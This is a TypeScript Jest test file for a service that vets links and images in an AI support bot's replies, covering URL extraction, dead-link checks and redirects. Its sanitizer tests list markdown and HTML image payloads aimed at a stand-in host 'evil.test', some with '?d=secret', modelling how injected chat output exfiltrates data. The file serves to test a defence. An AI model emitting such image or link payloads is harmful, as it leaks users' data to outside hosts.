import { describe, it, expect, jest, beforeEach, afterEach } from "@jest/globals";

jest.mock("@server/lib/logger", () => {
  const log = { debug: jest.fn(), info: jest.fn(), warn: jest.fn(), error: jest.fn() };
  return { createLogger: () => log };
});

const lookup = jest.fn<(host: string) => Promise<unknown>>();
jest.mock("dns/promises", () => ({
  __esModule: true,
  default: { lookup: (h: string) => lookup(h) },
}));
jest.mock("@server/utils/ssrf", () => ({
  validateUrlForSSRF: async () => undefined,
  safeFetch: (url: string, init: RequestInit) => global.fetch(url, init),
}));

import {
  LinkGuardrailService,
  checkLink,
  clearLinkStatusCache,
  extractUrls,
  normalizeUrl,
  removeLinks,
  sanitizeOutboundReply,
  type LinkStatus,
} from "../../services/core/link-guardrail.service";

describe("extractUrls", () => {
  it("finds markdown and bare links without trailing punctuation", () => {
    const text =
      "See [our sales page](https://shop.com/sales) or https://shop.com/faq. Also <https://x.io/a>, done!";
    expect(extractUrls(text)).toEqual([
      "https://shop.com/sales",
      "https://shop.com/faq",
      "https://x.io/a",
    ]);
  });

  it("reads URLs out of JSON-escaped tool output", () => {
    const json = JSON.stringify({ text: JSON.stringify({ url: "https://shop.com/p/1" }) });
    expect(extractUrls(json)).toEqual(["https://shop.com/p/1"]);
  });

  it("returns nothing for text without links", () => {
    expect(extractUrls("Visit our store at the mall")).toEqual([]);
  });
});

describe("normalizeUrl", () => {
  it("ignores www, case, trailing slash and fragment", () => {
    expect(normalizeUrl("https://WWW.Shop.com/sales/#top")).toBe(
      normalizeUrl("http://shop.com/sales"),
    );
  });

  it("keeps the query string", () => {
    expect(normalizeUrl("https://shop.com/s?q=1")).not.toBe(normalizeUrl("https://shop.com/s?q=2"));
  });
});

describe("LinkGuardrailService.assessLinks", () => {
  const statuses: Record<string, LinkStatus> = {};
  const check = jest.fn(async (url: string) => statuses[url] ?? "unknown");
  const service = new LinkGuardrailService(check);

  beforeEach(() => {
    check.mockClear();
    for (const key of Object.keys(statuses)) delete statuses[key];
  });

  it("trusts links found in the context without fetching them", async () => {
    const bad = await service.assessLinks({
      response: "Our policy: https://shop.com/returns/",
      contextTexts: ["# Returns\nSource: https://www.shop.com/returns\n..."],
    });
    expect(bad).toEqual([]);
    expect(check).not.toHaveBeenCalled();
  });

  it("flags a dead link that is not in the context", async () => {
    statuses["https://shop.com/sales"] = "dead";
    const bad = await service.assessLinks({
      response: "Go to [sales](https://shop.com/sales)",
      contextTexts: [],
      website: "shop.com",
    });
    expect(bad).toEqual([{ url: "https://shop.com/sales", reason: "dead" }]);
  });

  it("lets an own-site page with unknown status pass (sites that block bots)", async () => {
    const bad = await service.assessLinks({
      response: "See https://shop.com/page",
      contextTexts: [],
      website: "shop.com",
    });
    expect(bad).toEqual([]);
  });

  it("flags another host's link without requesting it", async () => {
    const bad = await service.assessLinks({
      response: "See https://other.com/page?d=order-1234",
      contextTexts: [],
      website: "shop.com",
    });
    expect(bad).toEqual([{ url: "https://other.com/page?d=order-1234", reason: "unverified" }]);
    expect(check).not.toHaveBeenCalled();
  });

  it("does not treat a known URL with a changed query as known", async () => {
    const bad = await service.assessLinks({
      response: "See https://other.com/page?d=secret",
      contextTexts: ["Source: https://other.com/page"],
    });
    expect(bad).toEqual([{ url: "https://other.com/page?d=secret", reason: "unverified" }]);
  });

  it("flags a live own-site page missing from the site index", async () => {
    statuses["https://shop.com/made-up"] = "live";
    const bad = await service.assessLinks({
      response: "See https://shop.com/made-up",
      contextTexts: [],
      website: "shop.com",
      siteUrls: ["https://shop.com/", "https://shop.com/about"],
    });
    expect(bad).toEqual([{ url: "https://shop.com/made-up", reason: "unlisted" }]);
  });

  it("does not flag own-site pages when there is no site index", async () => {
    statuses["https://shop.com/made-up"] = "live";
    const bad = await service.assessLinks({
      response: "See https://shop.com/made-up",
      contextTexts: [],
      website: "https://shop.com",
    });
    expect(bad).toEqual([]);
  });

  it("trusts the organization's website itself and pages in the site index", async () => {
    const bad = await service.assessLinks({
      response: "Visit https://shop.com or https://shop.com/about",
      contextTexts: [],
      website: "shop.com",
      siteUrls: ["https://shop.com/about"],
    });
    expect(bad).toEqual([]);
    expect(check).not.toHaveBeenCalled();
  });
});

describe("removeLinks", () => {
  it("keeps a markdown link's label and removes a bare URL", () => {
    expect(
      removeLinks("Read [the guide](https://x.io/a) or https://x.io/b today", [
        "https://x.io/a",
        "https://x.io/b",
      ]),
    ).toBe("Read the guide or today");
  });

  it("removes a reference definition", () => {
    expect(removeLinks("See [a][1]\n\n[1]: https://x.io/a", ["https://x.io/a"])).toBe("See [a][1]");
  });
});

describe("sanitizeOutboundReply", () => {
  const base = { contextTexts: [], toolResultTexts: [], website: "shop.com" };

  it.each([
    ["inline", "Look ![x](https://evil.test/p.png?d=secret) here"],
    ["titled", 'Look ![x](https://evil.test/p.png "t") here'],
    ["nested alt", "Look ![a[b]c](https://evil.test/p.png) here"],
    ["escaped alt", "Look ![a\\]b](https://evil.test/p.png) here"],
    ["protocol-relative", "Look ![x](//evil.test/p.png) here"],
    ["reference", "Look ![x][1] here\n\n[1]: https://evil.test/p.png"],
    ["shortcut", "Look ![x] here\n\n[x]: https://evil.test/p.png"],
    ["html", 'Look <img src="https://evil.test/p.png"> here'],
    ["html unterminated", 'Look <img src="https://evil.test/p.png'],
  ])("removes a %s image from another host", (_name, response) => {
    const result = sanitizeOutboundReply({ ...base, response });
    expect(result.text).not.toContain("evil.test");
    expect(result.approvedImages).toEqual([]);
    expect(result.removedImages.length).toBeGreaterThan(0);
  });

  it("keeps an image on the organization's site or subdomain", () => {
    const response = "![a](https://cdn.shop.com/a.png) ![b](https://shop.com/b.png)";
    const result = sanitizeOutboundReply({ ...base, response });
    expect(result.text).toBe(response);
    expect(result.approvedImages).toEqual(["https://cdn.shop.com/a.png", "https://shop.com/b.png"]);
  });

  it("keeps an image a tool returned this turn, word for word", () => {
    const url = "https://cdn.vendor.test/p.jpg?v=12";
    const result = sanitizeOutboundReply({
      ...base,
      response: `![p](${url})`,
      contextTexts: [JSON.stringify({ image: url })],
      toolResultTexts: [JSON.stringify({ image: url })],
    });
    expect(result.approvedImages).toEqual([url]);
    expect(result.text).toContain(url);
  });

  it("removes a tool's image when the model changed its query", () => {
    const result = sanitizeOutboundReply({
      ...base,
      response: "![p](https://cdn.vendor.test/p.jpg?d=secret)",
      toolResultTexts: ["https://cdn.vendor.test/p.jpg"],
    });
    expect(result.approvedImages).toEqual([]);
    expect(result.text).toBe("");
  });

  it("does not trust an image that only appears in a document or customer message", () => {
    const url = "https://evil.test/p.png";
    const result = sanitizeOutboundReply({
      ...base,
      response: `![p](${url})`,
      contextTexts: [url],
    });
    expect(result.approvedImages).toEqual([]);
  });

  it("removes other hosts' links nothing vouches for and leaves known ones", () => {
    const result = sanitizeOutboundReply({
      ...base,
      response:
        "See [known](https://docs.test/a), [bad](https://evil.test/?d=1), https://shop.com/x",
      contextTexts: ["https://docs.test/a"],
    });
    expect(result.text).toBe("See [known](https://docs.test/a), bad, https://shop.com/x");
    expect(result.removedLinks).toEqual(["https://evil.test/?d=1"]);
  });

  it("removes every unverified image and link when the context is empty", () => {
    const result = sanitizeOutboundReply({
      response: "![a](https://shop.com/a.png) [b](https://shop.com/b)",
      contextTexts: [],
      toolResultTexts: [],
    });
    expect(result.approvedImages).toEqual([]);
    expect(result.text).toBe("b");
  });
});

describe("checkLink", () => {
  const fetchMock = jest.fn<typeof fetch>();
  const realFetch = global.fetch;
  const res = (status: number, headers: Record<string, string> = {}) =>
    new Response(null, { status, headers });

  beforeEach(() => {
    clearLinkStatusCache();
    fetchMock.mockReset();
    lookup.mockReset();
    lookup.mockResolvedValue({ address: "93.184.216.34", family: 4 });
    global.fetch = fetchMock;
  });
  afterEach(() => {
    global.fetch = realFetch;
  });

  it("is live on 200", async () => {
    fetchMock.mockResolvedValue(res(200));
    expect(await checkLink("https://shop.com/a")).toBe("live");
  });

  it("is dead on 404 and 410", async () => {
    fetchMock.mockResolvedValueOnce(res(404));
    expect(await checkLink("https://shop.com/a")).toBe("dead");
    fetchMock.mockResolvedValueOnce(res(410));
    expect(await checkLink("https://shop.com/b")).toBe("dead");
  });

  it("is unknown on 403 and on timeouts", async () => {
    fetchMock.mockResolvedValueOnce(res(403));
    expect(await checkLink("https://shop.com/a")).toBe("unknown");
    fetchMock.mockRejectedValueOnce(new Error("timeout"));
    expect(await checkLink("https://shop.com/b")).toBe("unknown");
  });

  it("is dead when the host does not exist", async () => {
    lookup.mockRejectedValue(Object.assign(new Error("nope"), { code: "ENOTFOUND" }));
    expect(await checkLink("https://made-up-shop.example/a")).toBe("dead");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("falls back to GET when HEAD is not allowed", async () => {
    fetchMock.mockResolvedValueOnce(res(405)).mockResolvedValueOnce(res(200));
    expect(await checkLink("https://shop.com/a")).toBe("live");
    expect(fetchMock.mock.calls[1][1]?.method).toBe("GET");
  });

  it("follows redirects, and a deep link redirected to the home page is dead", async () => {
    fetchMock.mockResolvedValueOnce(res(301, { location: "/new" })).mockResolvedValueOnce(res(200));
    expect(await checkLink("https://shop.com/old")).toBe("live");

    fetchMock.mockResolvedValueOnce(res(302, { location: "https://www.shop.com/" }));
    expect(await checkLink("https://shop.com/missing")).toBe("dead");
  });

  it("does not follow a redirect off the site", async () => {
    fetchMock.mockResolvedValueOnce(res(302, { location: "https://elsewhere.test/page" }));
    await expect(checkLink("https://shop.com/leaves")).resolves.toBe("unknown");
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });

  it("caches results", async () => {
    fetchMock.mockResolvedValue(res(200));
    await checkLink("https://shop.com/a");
    await checkLink("https://shop.com/a");
    expect(fetchMock).toHaveBeenCalledTimes(1);
  });
});
